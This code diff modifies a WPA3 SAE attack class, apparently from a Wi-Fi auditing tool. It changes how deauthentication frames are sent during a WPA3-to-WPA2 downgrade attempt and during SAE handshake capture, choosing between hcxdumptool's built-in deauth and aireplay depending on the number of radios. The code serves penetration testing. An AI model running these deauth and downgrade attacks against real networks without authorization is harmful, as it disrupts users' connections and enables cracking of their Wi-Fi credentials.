@@ -771,6 +771,15 @@ class AttackWPA3SAE(Attack):
             return capture, secondary
         return capture, None
 
+    @staticmethod
+    def _downgrade_capture_deauth(airodump_interface):
+        """True when hcxdumptool must handle deauth itself.
+
+        With only one radio, an external aireplay run would share the
+        interface hcxdumptool owns; let hcxdumptool deauth instead.
+        """
+        return airodump_interface is None
+
     def attempt_downgrade(self):
         """
         Attempt to downgrade WPA3 connection to WPA2.
@@ -805,8 +814,11 @@ class AttackWPA3SAE(Attack):
             hcxdump = HcxDumpTool(interface=capture_interface,
                                   channel=self.target.channel,
                                   target_bssid=self.target.bssid,
-                                  enable_deauth=False,  # We'll manually deauth
-                                  pmf_required=False)
+                                  enable_deauth=self._downgrade_capture_deauth(
+                                      airodump_interface),
+                                  pmf_required=False,
+                                  manage_interface=True,
+                                  band=getattr(self.target, 'band', None))
             hcxdump.__enter__()
 
             # airodump must never share an interface with hcxdumptool.
@@ -919,8 +931,10 @@ class AttackWPA3SAE(Attack):
                     time.sleep(step_timer.remaining())
                     continue
                 
-                # Deauth clients periodically to trigger reconnection
-                if deauth_timer.ended():
+                # Deauth clients periodically to trigger reconnection. External deauth
+                # runs on the airodump radio only; with a single radio
+                # hcxdumptool's built-in deauth owns the interface.
+                if deauth_timer.ended() and airodump_interface is not None:
                     Color.pattack('WPA3', self.target, 'Downgrade',
                                  'Deauthing clients to force reconnection...')
                     
@@ -936,7 +950,9 @@ class AttackWPA3SAE(Attack):
                         client_mac = getattr(client, 'station', None)
                         label = client_mac or '*broadcast*'
                         try:
-                            Aireplay.deauth(self.target.bssid, client_mac=client_mac, num_deauths=5)
+                            Aireplay.deauth(self.target.bssid, client_mac=client_mac,
+                                            num_deauths=5,
+                                            interface=airodump_interface)
                             deauth_success = True
                         except Exception as e:
                             Color.pl('{!} {O}Deauth failed for client %s: %s{W}' % (label, str(e)))
@@ -959,6 +975,9 @@ class AttackWPA3SAE(Attack):
                         if self.view:
                             self.view.add_log('Max deauth attempts - downgrade may not be possible')
                         break
+                elif deauth_timer.ended():
+                    # Single radio: hcxdumptool's built-in deauth runs instead.
+                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
                 
                 # Check for captured handshake
                 # After deauth, clients should reconnect with WPA2
@@ -1081,7 +1100,8 @@ class AttackWPA3SAE(Attack):
                             target_bssid=self.target.bssid,
                             enable_deauth=enable_deauth,
                             pmf_required=pmf_required,
-                            manage_interface=not enable_deauth)
+                            manage_interface=True,
+                            band=getattr(self.target, 'band', None))
             hcxdump.__enter__()
             
             Color.clear_entire_line()
@@ -1090,11 +1110,12 @@ class AttackWPA3SAE(Attack):
             # Set timeout for SAE capture (use WPA3-specific timeout if configured)
             timeout_value = Configuration.wpa3_attack_timeout if Configuration.wpa3_attack_timeout else Configuration.wpa_attack_timeout
             capture_timeout = Timer(timeout_value)
-            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
             
             Color.pl('{+} {C}Capturing SAE handshake with hcxdumptool...{W}')
             if pmf_required:
                 Color.pl('{!} {O}PMF required - using passive capture (no deauth){W}')
+            else:
+                Color.pl('{+} {C}hcxdumptool will send the deauth frames itself{W}')
             
             incomplete_handshake_count = 0
             max_incomplete_attempts = 3
@@ -1131,23 +1152,8 @@ class AttackWPA3SAE(Attack):
                            (progress_pct, str(capture_timeout)))
                     last_progress_update = current_time
                 
-                # Deauth clients periodically if allowed
-                if enable_deauth and deauth_timer.ended():
-                    Color.pattack('WPA3', self.target, 'SAE Capture',
-                                 'Deauthing clients to trigger SAE...')
-                    
-                    if self.view:
-                        self.view.add_log('Sending deauth to trigger SAE authentication')
-                    
-                    try:
-                        # Use aireplay to deauth
-                        Aireplay.deauth(self.target.bssid, essid=self.target.essid, num_deauths=5)
-                    except Exception as e:
-                        Color.pl('{!} {O}Deauth failed: %s{W}' % str(e))
-                        if self.view:
-                            self.view.add_log(f'Deauth error: {str(e)}')
-                    
-                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
+                # Deauth is handled by hcxdumptool itself (enable_deauth above): an
+                # external aireplay run would share the capture interface.
                 
                 # Check if we've captured data
                 try:
@@ -1271,7 +1277,8 @@ class AttackWPA3SAE(Attack):
                             target_bssid=self.target.bssid,
                             enable_deauth=False,  # Passive mode
                             pmf_required=True,
-                            manage_interface=True)
+                            manage_interface=True,
+                            band=getattr(self.target, 'band', None))
             hcxdump.__enter__()
             
             Color.clear_entire_line()
